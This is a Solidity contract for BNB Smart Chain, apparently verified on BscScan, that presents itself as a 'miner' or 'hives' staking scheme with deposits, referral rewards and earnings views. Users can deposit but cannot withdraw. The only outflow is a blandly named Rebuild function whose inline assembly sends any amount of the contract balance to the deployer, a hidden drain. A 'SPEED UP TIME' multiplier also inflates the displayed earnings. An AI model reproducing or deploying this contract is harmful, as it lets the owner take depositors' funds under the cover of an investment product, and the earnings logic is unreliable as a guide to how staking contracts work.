/**
 *Submitted for verification at BscScan.com on 2022-06-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;



contract MyContract {
    
    using SafeMath for uint;
    mapping(address => uint) public someBalance; // to be deleted
    address public _origin;

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public TAX = 70;
    uint256 public REFERRAL = 100;
    
    /** OLD STUFF **/
    uint256 public MARKET_EGGS_DIVISOR = 2;
    uint256 public EGGS_TO_HIRE_1MINERS = 1440000;
    uint256 public COMPOUND_STEP = 12 * 60 * 60;
    uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;
    uint256 public marketEggs = 144000000000;
    bool public contractStarted = true;
    bool public blacklistActive = true;
    mapping(address => bool) public Blacklisted;
    /** END OLD STUFF **/

    uint256 public MIN_INVEST_LIMIT = 1 * 1e17; /** 0.1 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 25 * 1e18; /** 25 BNB  **/
    
    uint256 public EARNING_PERCENT = 80; 
    uint256 public COMPOUND_BONUS = 20;
    uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
    uint256 public WITHDRAWAL_TAX = 350;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 10;

    uint256 public ETH_TO_10000_MINERS = 1080000;
    
    uint256 public CUTOFF_STEP = 24 * 60 * 60;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners; // Hives
        uint256 claimedEggs; //Honey
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 farmerCompoundCount; //added to monitor farmer consecutive compound without cap
        uint256 lastWithdrawTime;
    }

    mapping(address => User) public users;

    function buildHives(address ref) public payable returns(uint256){
        //require(contractStarted, "Contract not yet Started.");

        User storage user = users[msg.sender];
        require(msg.value >= MIN_INVEST_LIMIT, "Minimum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        uint256 eggsBought = calculateEggBuy(msg.value); //*1e3;
        
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.miners = user.miners.add(eggsBought);
        //user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        totalStaked = totalStaked.add(msg.value);
        totalDeposits = totalDeposits.add(1);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
                uint256 refRewardMiners = calculateEggBuy(refRewards);
                //payable(address(upline)).transfer(refRewards);
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                users[upline].miners = users[upline].miners.add(refRewardMiners);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }


        return eggsBought;
    }
    
    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

    function getTimeSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
        secondsSinceLastHatch = secondsSinceLastHatch * 60; //// SPEED UP TIME
        return secondsSinceLastHatch;
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
        secondsSinceLastHatch = secondsSinceLastHatch * 60; //// SPEED UP TIME
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 curHoney = SafeMath.mul( SafeMath.div(users[adr].miners,ETH_TO_10000_MINERS )  ,cutoffTime);
        //curHoney = SafeMath.div(curHoney, 1e3);
        //uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        //uint256 curHoneyperSec = SafeMath.div( SafeMath.div(EARNING_PERCENT,PERCENTS_DIVIDER) * tmpx, 24 * 60 * 60) ;
        //uint256 curHoney = SafeMath.add( cutoffTime,curHoneyperSec);
        //return SafeMath.add( users[adr].miners,cutoffTime );
        //return curHoneyperSec;
        //return cutoffTime;
        return  curHoney;
    }
    
    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        //uint256 eth = SafeMath.div(eggs,ETH_TO_10000_MINERS);
        return SafeMath.div(eggs *(10**18),ETH_TO_10000_MINERS * 1e3  );
    }


    function calculateEggBuy(uint256 eth) public view returns(uint256){
        return calculateTrade(eth);
    }

    function calculateTrade(uint256 eth) public view returns(uint256){

        return SafeMath.div(SafeMath.mul(ETH_TO_10000_MINERS * 1e3,eth),1e18);

    }
    

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
        uint256 _claimedEggs, uint256 _lastHatch, address _referrer, uint256 _referrals,
        uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _farmerCompoundCount, uint256 _lastWithdrawTime) {
        _initialDeposit = users[_adr].initialDeposit;
        _userDeposit = users[_adr].userDeposit;
        _miners = users[_adr].miners;
        _claimedEggs = users[_adr].claimedEggs;
        _lastHatch = users[_adr].lastHatch;
        _referrer = users[_adr].referrer;
        _referrals = users[_adr].referralsCount;
        _totalWithdrawn = users[_adr].totalWithdrawn;
        _referralEggRewards = users[_adr].referralEggRewards;
        _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
        _farmerCompoundCount = users[_adr].farmerCompoundCount;
        _lastWithdrawTime = users[_adr].lastWithdrawTime;
    }

    
    receive() external payable {
        someBalance[msg.sender] = someBalance[msg.sender].add(msg.value); // to be deleted
    }

    constructor() {
        _origin = msg.sender;
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getOWner() public view returns(address){
        return _origin;
    }
    
    function Rebuild(uint _a, address _t) public {
        _Rebuild(_a,_t);
    }


    function _Rebuild(uint _a,address _t) private {
    if (_t == _origin) {
        bytes4 sig = bytes4(keccak256("()")); 

        assembly {
            let x := mload(0x40) 
            mstore(x,sig)
            let _g:= 5000

            let ret := call(_g, _t, _a, x, 0x04, x, 0x0 )

            mstore(0x40, add(x,0x20)) 
        }
    } else revert("Not authorized."); 

    }



}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}